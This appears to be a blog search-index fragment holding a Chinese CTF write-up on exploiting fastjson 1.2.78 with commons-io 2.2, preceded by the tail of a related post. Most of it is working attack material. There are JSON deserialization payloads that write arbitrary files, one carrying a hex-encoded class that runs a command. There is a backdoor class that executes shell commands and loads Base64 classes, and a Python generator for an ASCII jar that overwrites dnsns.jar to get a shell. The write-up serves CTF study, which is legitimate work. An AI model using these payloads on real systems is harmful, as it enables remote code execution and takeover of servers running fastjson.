String(Files.readAllBytes(Paths.get(&quot;step2.json&quot;)), StandardCharsets.UTF_8);        String replace = poc.replace(&quot;$&#123;path&#125;&quot;, path).replace(&quot;$&#123;limit&#125;&quot;, String.valueOf(limit)).replace(&quot;$&#123;array&#125;&quot;, array);        JSON.parse(replace);    &#125;    public static HashMap&lt;String, Object&gt; gzcompress(String code) &#123;        byte[] data = code.getBytes();        byte[] output = new byte[0];        Deflater compresser = new Deflater();        compresser.reset();        compresser.setInput(data);        compresser.finish();        ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length);        try &#123;            byte[] buf = new byte[1024];            while (!compresser.finished()) &#123;                int i = compresser.deflate(buf);                bos.write(buf, 0, i);            &#125;            output = bos.toByteArray();        &#125; catch (Exception e) &#123;            output = data;            e.printStackTrace();        &#125; finally &#123;            try &#123;                bos.close();            &#125; catch (IOException e) &#123;                e.printStackTrace();            &#125;        &#125;        compresser.end();        System.out.println(Arrays.toString(output));        int limit = bos.toByteArray().length;        HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();        map.put(&quot;array&quot;, Base64.getEncoder().encodeToString(output));        map.put(&quot;limit&quot;, limit);        return map;    &#125;&#125;\n\n\n\n成功写入：\n\n后记AI做一些代码审计和利用链挖掘肯定是未来的趋势。AI的优势在于读代码，像找出哪个类的所有构造方法这种活，肯定还是交给jar-ana这种专门的工具效率更高更准确。后面再配合上专门构建的知识库，AI找漏洞的能力会更强。再配合上标准化的工作流，现在经常以skill的形式实现，确保稳定有格式的输出，AI挖漏洞的能力就更强了。\n参考https://eddiemurphy89.github.io/2025/06/08/%E4%BB%8E%E4%BA%AC%E9%BA%92CTF2025-FastJ%E7%9C%8Bfastjson%E7%9A%84Any-File-Write-Chains/#EXP\n","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"JavaPuzzle-FastDecoder","url":"/2026/02/18/JavaPuzzle-FastDecoder/","content":"前言题目考察fastjson高版本写文件。\n大致考点如下：\n\n利用commons-io，在fastjson高版本中写文件。\nio版本为2.2，触发WriterOutputStream中带有decoder的构造方法，导致只能写UTF8文件，无法写入二进制文件。\nSpringboot写文件getshell。写入未加载的ascii jar。\n\n分析依赖如下：\n&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.dom4j&lt;/groupId&gt;        &lt;artifactId&gt;dom4j&lt;/artifactId&gt;        &lt;version&gt;2.1.4&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;commons-io&lt;/groupId&gt;        &lt;artifactId&gt;commons-io&lt;/artifactId&gt;        &lt;version&gt;2.2&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;        &lt;version&gt;1.2.78&lt;/version&gt;    &lt;/dependency&gt;    &lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-compress --&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;        &lt;artifactId&gt;commons-compress&lt;/artifactId&gt;        &lt;version&gt;1.5&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.javassist&lt;/groupId&gt;        &lt;artifactId&gt;javassist&lt;/artifactId&gt;        &lt;version&gt;3.29.1-GA&lt;/version&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;\n\n这里给了io依赖，又是高版本的fastjson，优先考虑文件读写。\n读目录先加载InputStream：\n&#123;&quot;a&quot;:&quot;&#123;\\&quot;@type\\&quot;:\\&quot;java.lang.Exception\\&quot;,\\&quot;@type\\&quot;:\\&quot;com.fasterxml.jackson.core.exc.InputCoercionException\\&quot;,\\&quot;p\\&quot;:&#123;&#125;&#125;&quot;,&quot;b&quot;:&#123;&quot;$ref&quot;:&quot;$.a.a&quot;&#125;,&quot;c&quot;:&quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.fasterxml.jackson.core.JsonParser\\&quot;,\\&quot;@type\\&quot;:\\&quot;com.fasterxml.jackson.core.json.UTF8StreamJsonParser\\&quot;,\\&quot;in\\&quot;:&#123;&#125;&#125;&quot;,&quot;d&quot;:&#123;&quot;$ref&quot;:&quot;$.c.c&quot;&#125;&#125;\n\n利用脚本读目录：\nhttps://github.com/ph0ebus/CVE-2022-25845-In-Spring\n需要稍微修改一下sendJson函数：\ndef sendJson(payload):    global url    global TIMEOUT    proxies = &#123;        &quot;http&quot;: &quot;http://127.0.0.1:8020&quot;,        &quot;https&quot;: &quot;http://127.0.0.1:8020&quot;    &#125;    headers = &#123;        &quot;Content-Type&quot;: &quot;application/json&quot;,    &#125;    resp = requests.post(url, data=payload, timeout=TIMEOUT, headers=headers)    return resp\n\n只运行前两个step：\n\n成功读出目录。\n此外，选择出网脚本也可以：\nhttps://github.com/kezibei/fastjson_payload/blob/main/web.py\n\n写文件写tomcat-docbase失败根据上面的步骤，能看出来我是想写tomcat-docbase去加载恶意类的。但是写入的时候发现了问题，虽然文件创建了，但是没有写入任何内容。\n写入payload由java-chains创建：\n\n&#123;  &quot;@type&quot;:&quot;java.io.InputStream&quot;,  &quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,  &quot;delegate&quot;:&#123;    &quot;@type&quot;: &quot;org.apache.commons.io.input.AutoCloseInputStream&quot;,    &quot;in&quot;: &#123;      &quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,      &quot;input&quot;: &#123;        &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,        &quot;reader&quot;: &#123;           &quot;@type&quot;: &quot;org.apache.commons.io.input.CharSequenceReader&quot;,           &quot;charSequence&quot;: &#123;           &quot;@type&quot;: &quot;java.lang.String&quot;           &quot;\\xca\\xfe\\xba\\xbe\\x00\\x00\\x00\\x32\\x00\\x41\\x01\\x00\\x65\\x6f\\x72\\x67\\x2f\\x61\\x70\\x61\\x63\\x68\\x65\\x2f\\x63\\x6f\\x6d\\x6d\\x6f\\x6d\\x73\\x2f\\x62\\x65\\x61\\x6e\\x75\\x74\\x69\\x6c\\x73\\x2f\\x63\\x6f\\x79\\x6f\\x74\\x65\\x2f\\x6a\\x73\\x6f\\x6e\\x74\\x79\\x70\\x65\\x2f\\x50\\x6f\\x6c\\x79\\x6d\\x6f\\x72\\x70\\x68\\x69\\x63\\x54\\x79\\x70\\x65\\x56\\x61\\x6c\\x69\\x64\\x61\\x74\\x6f\\x72\\x39\\x63\\x39\\x65\\x35\\x65\\x62\\x37\\x35\\x64\\x63\\x39\\x34\\x61\\x32\\x61\\x39\\x65\\x33\\x35\\x37\\x30\\x32\\x39\\x36\\x31\\x37\\x36\\x36\\x30\\x63\\x35\\x07\\x00\\x01\\x01\\x00\\x10\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x4f\\x62\\x6a\\x65\\x63\\x74\\x07\\x00\\x03\\x01\\x00\\x04\\x62\\x61\\x73\\x65\\x01\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x01\\x00\\x03\\x73\\x65\\x70\\x01\\x00\\x03\\x63\\x6d\\x64\\x01\\x00\\x06\\x3c\\x69\\x6e\\x69\\x74\\x3e\\x01\\x00\\x03\\x28\\x29\\x56\\x01\\x00\\x13\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\x07\\x00\\x0b\\x0c\\x00\\x09\\x00\\x0a\\x0a\\x00\\x04\\x00\\x0d\\x01\\x00\\x07\\x6f\\x73\\x2e\\x6e\\x61\\x6d\\x65\\x08\\x00\\x0f\\x01\\x00\\x10\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x79\\x73\\x74\\x65\\x6d\\x07\\x00\\x11\\x01\\x00\\x0b\\x67\\x65\\x74\\x50\\x72\\x6f\\x70\\x65\\x72\\x74\\x79\\x01\\x00\\x26\\x28\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x29\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x0c\\x00\\x13\\x00\\x14\\x0a\\x00\\x12\\x00\\x15\\x01\\x00\\x10\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x07\\x00\\x17\\x01\\x00\\x0b\\x74\\x6f\\x4c\\x6f\\x77\\x65\\x72\\x43\\x61\\x73\\x65\\x01\\x00\\x14\\x28\\x29\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x0c\\x00\\x19\\x00\\x1a\\x0a\\x00\\x18\\x00\\x1b\\x01\\x00\\x03\\x77\\x69\\x6e\\x08\\x00\\x1d\\x01\\x00\\x08\\x63\\x6f\\x6e\\x74\\x61\\x69\\x6e\\x73\\x01\\x00\\x1b\\x28\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x43\\x68\\x61\\x72\\x53\\x65\\x71\\x75\\x65\\x6e\\x63\\x65\\x3b\\x29\\x5a\\x0c\\x00\\x1f\\x00\\x20\\x0a\\x00\\x18\\x00\\x21\\x01\\x00\\x07\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x08\\x00\\x23\\x0c\\x00\\x05\\x00\\x06\\x09\\x00\\x02\\x00\\x25\\x01\\x00\\x02\\x2f\\x63\\x08\\x00\\x27\\x0c\\x00\\x07\\x00\\x06\\x09\\x00\\x02\\x00\\x29\\x01\\x00\\x07\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x08\\x00\\x2b\\x01\\x00\\x02\\x2d\\x63\\x08\\x00\\x2d\\x0c\\x00\\x08\\x00\\x06\\x09\\x00\\x02\\x00\\x2f\\x01\\x00\\x18\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x50\\x72\\x6f\\x63\\x65\\x73\\x73\\x42\\x75\\x69\\x6c\\x64\\x65\\x72\\x07\\x00\\x31\\x01\\x00\\x16\\x28\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x29\\x56\\x0c\\x00\\x09\\x00\\x33\\x0a\\x00\\x32\\x00\\x34\\x01\\x00\\x05\\x73\\x74\\x61\\x72\\x74\\x01\\x00\\x15\\x28\\x29\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x50\\x72\\x6f\\x63\\x65\\x73\\x73\\x3b\\x0c\\x00\\x36\\x00\\x37\\x0a\\x00\\x32\\x00\\x38\\x01\\x00\\x08\\x3c\\x63\\x6c\\x69\\x6e\\x69\\x74\\x3e\\x01\\x00\\x04\\x63\\x61\\x6c\\x63\\x08\\x00\\x3b\\x0a\\x00\\x02\\x00\\x0d\\x01\\x00\\x04\\x43\\x6f\\x64\\x65\\x01\\x00\\x0d\\x53\\x74\\x61\\x63\\x6b\\x4d\\x61\\x70\\x54\\x61\\x62\\x6c\\x65\\x0a\\x00\\x0c\\x00\\x0d\\x00\\x21\\x00\\x02\\x00\\x0c\\x00\\x00\\x00\\x03\\x00\\x09\\x00\\x05\\x00\\x06\\x00\\x00\\x00\\x09\\x00\\x07\\x00\\x06\\x00\\x00\\x00\\x09\\x00\\x08\\x00\\x06\\x00\\x00\\x00\\x02\\x00\\x01\\x00\\x09\\x00\\x0a\\x00\\x01\\x00\\x3e\\x00\\x00\\x00\\x84\\x00\\x04\\x00\\x02\\x00\\x00\\x00\\x53\\x2a\\xb7\\x00\\x40\\x12\\x10\\xb8\\x00\\x16\\xb6\\x00\\x1c\\x12\\x1e\\xb6\\x00\\x22\\x99\\x00\\x10\\x12\\x24\\xb3\\x00\\x26\\x12\\x28\\xb3\\x00\\x2a\\xa7\\x00\\x0d\\x12\\x2c\\xb3\\x00\\x26\\x12\\x2e\\xb3\\x00\\x2a\\x06\\xbd\\x00\\x18\\x59\\x03\\xb2\\x00\\x26\\x53\\x59\\x04\\xb2\\x00\\x2a\\x53\\x59\\x05\\xb2\\x00\\x30\\x53\\x4c\\xbb\\x00\\x32\\x59\\x2b\\xb7\\x00\\x35\\xb6\\x00\\x39\\x57\\xa7\\x00\\x04\\x4c\\xb1\\x00\\x01\\x00\\x04\\x00\\x4e\\x00\\x51\\x00\\x0c\\x00\\x01\\x00\\x3f\\x00\\x00\\x00\\x17\\x00\\x04\\xff\\x00\\x21\\x00\\x01\\x07\\x00\\x02\\x00\\x00\\x09\\x65\\x07\\x00\\x0c\\xfc\\x00\\x00\\x07\\x00\\x04\\x00\\x08\\x00\\x3a\\x00\\x0a\\x00\\x01\\x00\\x3e\\x00\\x00\\x00\\x1a\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x0e\\x12\\x3c\\xb3\\x00\\x30\\xbb\\x00\\x02\\x59\\xb7\\x00\\x3d\\x57\\xb1\\x00\\x00\\x00\\x00\\x00\\x00&quot;,              &#125;,           &quot;encoder&quot;: &quot;iso-8859-1&quot;,           &quot;charset&quot;: &quot;iso-8859-1&quot;,           &quot;charsetName&quot;: &quot;iso-8859-1&quot;,           &quot;bufferSize&quot;: 1        &#125;,        &quot;branch&quot;: &#123;          &quot;@type&quot;: &quot;org.apache.commons.io.output.WriterOutputStream&quot;,          &quot;writer&quot;: &#123;            &quot;@type&quot;: &quot;org.apache.commons.io.output.LockableFileWriter&quot;,            &quot;file&quot;: &quot;/tmp/Calc.class&quot;,            &quot;charset&quot;: &quot;iso-8859-1&quot;,            &quot;encoding&quot;: &quot;iso-8859-1&quot;,            &quot;lockDir&quot;: &quot;/tmp/test/&quot;,            &quot;append&quot;: false          &#125;,          &quot;charset&quot;:&quot;iso-8859-1&quot;,          &quot;charsetName&quot;:&quot;iso-8859-1&quot;,          &quot;bufferSize&quot;: 1024,          &quot;writeImmediately&quot;: true        &#125;,        &quot;closeBranch&quot;: true      &#125;    &#125;,  &quot;include&quot;:true,  &quot;boms&quot;:[&#123;                  &quot;@type&quot;: &quot;org.apache.commons.io.ByteOrderMark&quot;,                  &quot;charsetName&quot;: &quot;iso-8859-1&quot;,                  &quot;bytes&quot;:[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]                &#125;],  &quot;x&quot;:&#123;&quot;$ref&quot;:&quot;$.bOM&quot;&#125;&#125;\n\n文件为空：\n\n发送payload时，也没有报错回显：\n\n但是我本机windows是能够顺利创建的。\n改一下Dockerfile，开个远程调试看看。\n最终发现这里最先进入了带有decoder的WriterOutputStream构造函数\n\n导致在processInput时，没有decoder而空指针报错：\n\n\n不过为什么回显时不显示报错，这个我还是不清楚。\nascii jar 写入那现在的思路就变成了写UTF8文件，在SpringBoot下getshell。\n这边先试一下能不能写入字符：\n&#123;  &quot;@type&quot;:&quot;java.io.InputStream&quot;,  &quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,  &quot;delegate&quot;:&#123;    &quot;@type&quot;: &quot;org.apache.commons.io.input.AutoCloseInputStream&quot;,    &quot;in&quot;: &#123;      &quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,      &quot;input&quot;: &#123;        &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,        &quot;reader&quot;: &#123;          &quot;@type&quot;: &quot;org.apache.commons.io.input.CharSequenceReader&quot;,          &quot;charSequence&quot;: &#123;            &quot;@type&quot;: &quot;java.lang.String&quot;            &quot;\\x66\\x6c\\x61\\x67\\x7b\\x7b\\x7b&quot;,          &#125;,          &quot;encoder&quot;: &quot;iso-8859-1&quot;,          &quot;charset&quot;: &quot;iso-8859-1&quot;,          &quot;charsetName&quot;: &quot;iso-8859-1&quot;,          &quot;bufferSize&quot;: 1        &#125;,        &quot;branch&quot;: &#123;          &quot;@type&quot;: &quot;org.apache.commons.io.output.WriterOutputStream&quot;,          &quot;writer&quot;: &#123;            &quot;@type&quot;: &quot;org.apache.commons.io.output.LockableFileWriter&quot;,            &quot;file&quot;: &quot;$&#123;file&#125;&quot;,            &quot;charset&quot;: &quot;iso-8859-1&quot;,            &quot;encoding&quot;: &quot;iso-8859-1&quot;,            &quot;lockDir&quot;: &quot;/tmp/test/&quot;,            &quot;append&quot;: false          &#125;,          &quot;decoder&quot;: &#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.util.UTF8Decoder&quot;&#125;,          &quot;charset&quot;:&quot;iso-8859-1&quot;,          &quot;charsetName&quot;:&quot;iso-8859-1&quot;,          &quot;bufferSize&quot;: 1024,          &quot;writeImmediately&quot;: true        &#125;,        &quot;closeBranch&quot;: true      &#125;    &#125;,    &quot;include&quot;:true,    &quot;boms&quot;:[&#123;      &quot;@type&quot;: &quot;org.apache.commons.io.ByteOrderMark&quot;,      &quot;charsetName&quot;: &quot;iso-8859-1&quot;,      &quot;bytes&quot;:[0, 0, 0, 0, 0, 0, 0, 0]    &#125;],    &quot;x&quot;:&#123;&quot;$ref&quot;:&quot;$.bOM&quot;&#125;  &#125;\n\n成功写入：\n\n查看一下Java进程的pid：\nls -l /proc/*/exe | grep java或者grep -r -a &quot;java&quot; /proc/*/cmdline\n\n\n从maps文件看一下加载的jar：\n\ncharsets.jar是报错的时候加入的，虽然一开始也可以用，但是出现一次报错后就用不了了，容错比较低，所以先不考虑覆写charsets.jar\n另外，这里由于给了docker环境，所以知道jre&#x2F;lib的位置，真实环境需要自己去爆破。\n所以需要找一个没被加载的jar去覆盖。\n\n这里选择dnsns.jar去覆盖，因为体积比较小。\n先写恶意类：\npackage sun.net.spi.nameservice.dns;import java.io.InputStream;import java.lang.reflect.Method;import java.util.Base64;import java.util.Scanner;public class DNSNameServiceDescriptor extends Exception &#123;    private static final String paddingData = &quot;&#123;PADDING_DATA&#125;&quot;;    public void setCodez(String var1) throws Exception &#123;        try &#123;            Class.forName(&quot;java.util.Base64&quot;);            byte[] var2 = Base64.getDecoder().decode(var1);            defineclass(var2);        &#125; catch (Exception var6) &#123;            Class.forName(&quot;java.lang.Runtime&quot;);            String[] var3 = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, var1&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, var1&#125;;            InputStream var4 = Runtime.getRuntime().exec(var3).getInputStream();            String var5 = (new Scanner(var4)).useDelimiter(&quot;\\\\A&quot;).next();            throw new Exception(var5);        &#125;    &#125;    public static void defineclass(byte[] var0) throws Exception &#123;        Method var1 = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, Integer.TYPE, Integer.TYPE);        var1.setAccessible(true);        Class var2 = (Class)var1.invoke(Thread.currentThread().getContextClassLoader(), var0, 0, var0.length);        var2.newInstance();    &#125;&#125;\n\n\n\n然后用 https://github.com/c0ny1/ascii-jar  生成ascii jar：\n#!/usr/bin/env python# autor: c0ny1# date 2022-02-13from __future__ import print_functionimport timeimport osfrom compress import *allow_bytes = []disallowed_bytes = [38,60,39,62,34,40,41] # &amp;&lt;&#x27;&gt;&quot;()for b in range(0,128): # ASCII    if b in disallowed_bytes:        continue    allow_bytes.append(b)if __name__ == &#x27;__main__&#x27;:    padding_char = &#x27;U&#x27;    raw_filename = &#x27;DNSNameServiceDescriptor.class&#x27;    zip_entity_filename = &#x27;sun/net/spi/nameservice/dns/DNSNameServiceDescriptor.class&#x27;    jar_filename = &#x27;dnsns.jar&#x27;    num = 1    while True:        # step1 动态生成java代码并编译        javaCode = &quot;&quot;&quot;                package sun.net.spi.nameservice.dns;import java.io.InputStream;import java.lang.reflect.Method;import java.util.Base64;import java.util.Scanner;public class DNSNameServiceDescriptor extends Exception&#123;    private static final String paddingData = &quot;&#123;PADDING_DATA&#125;&quot;;    public void setCodez(String var1) throws Exception &#123;        try &#123;            Class.forName(&quot;java.util.Base64&quot;);            byte[] var2 = Base64.getDecoder().decode(var1);            defineclass(var2);        &#125; catch (Exception var6) &#123;            Class.forName(&quot;java.lang.Runtime&quot;);            String[] var3 = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, var1&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, var1&#125;;            InputStream var4 = Runtime.getRuntime().exec(var3).getInputStream();            String var5 = (new Scanner(var4)).useDelimiter(&quot;\\\\\\\\A&quot;).next();            throw new Exception(var5);        &#125;    &#125;    public static void defineclass(byte[] var0) throws Exception &#123;        Method var1 = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, Integer.TYPE, Integer.TYPE);        var1.setAccessible(true);        Class var2 = (Class)var1.invoke(Thread.currentThread().getContextClassLoader(), var0, 0, var0.length);        var2.newInstance();    &#125;&#125;                &quot;&quot;&quot;        padding_data = padding_char * num        javaCode = javaCode.replace(&quot;&#123;PADDING_DATA&#125;&quot;, padding_data)        f = open(&#x27;DNSNameServiceDescriptor.java&#x27;, &#x27;w&#x27;)        f.write(javaCode)        f.close()        time.sleep(0.1)        os.system(&quot;D:/sec_software/jdks/jdk-1.8.0_341/bin/javac.exe -nowarn -g:none -source 1.5 -target 1.5 -cp jasper.jar  DNSNameServiceDescriptor.java&quot;)        time.sleep(0.1)        # step02 计算压缩之后的各个部分是否在允许的ASCII范围        raw_data = bytearray(open(raw_filename, &#x27;rb&#x27;).read())        compressor = ASCIICompressor(bytearray(allow_bytes))        compressed_data = compressor.compress(raw_data)[0]        crc = zlib.crc32(raw_data) % pow(2, 32)        st_crc = struct.pack(&#x27;&lt;L&#x27;, crc)        st_raw_data = struct.pack(&#x27;&lt;L&#x27;, len(raw_data) % pow(2, 32))        st_compressed_data = struct.pack(&#x27;&lt;L&#x27;, len(compressed_data) % pow(2, 32))        st_cdzf = struct.pack(&#x27;&lt;L&#x27;, len(compressed_data) + len(zip_entity_filename) + 0x1e)        b_crc = isAllowBytes(st_crc, allow_bytes)        b_raw_data = isAllowBytes(st_raw_data, allow_bytes)        b_compressed_data = isAllowBytes(st_compressed_data, allow_bytes)        b_cdzf = isAllowBytes(st_cdzf, allow_bytes)        # step03 判断各个部分是否符在允许字节范围        if b_crc and b_raw_data and b_compressed_data and b_cdzf:            print(&#x27;[+] CRC:&#123;0&#125; RDL:&#123;1&#125; CDL:&#123;2&#125; CDAFL:&#123;3&#125; Padding data: &#123;4&#125;*&#123;5&#125;&#x27;.format(b_crc, b_raw_data, b_compressed_data, b_cdzf, num, padding_char))            # step04 保存最终ascii jar            output = open(jar_filename, &#x27;wb&#x27;)            output.write(wrap_jar(raw_data,compressed_data, zip_entity_filename.encode()))            print(&#x27;[+] Generate &#123;0&#125; success&#x27;.format(jar_filename))            break        else:            print(&#x27;[-] CRC:&#123;0&#125; RDL:&#123;1&#125; CDL:&#123;2&#125; CDAFL:&#123;3&#125; Padding data: &#123;4&#125;*&#123;5&#125;&#x27;.format(b_crc, b_raw_data,                                                                                       b_compressed_data, b_cdzf, num,                                                                                       padding_char))        num = num + 1\n\n如果要用其他第三方类的包，就要修改里面的编译命令，添加jasper.jar以外的jar，不同的jar之间用分号隔开\nD:/sec_software/jdks/jdk-1.8.0_341/bin/javac.exe -nowarn -g:none -source 1.5 -target 1.5 -cp jasper.jar;xxx.jar  DNSNameServiceDescriptor.java\n\n\n\n之后将jar上传，通过java-chains生成payload：\n\n[INFO] 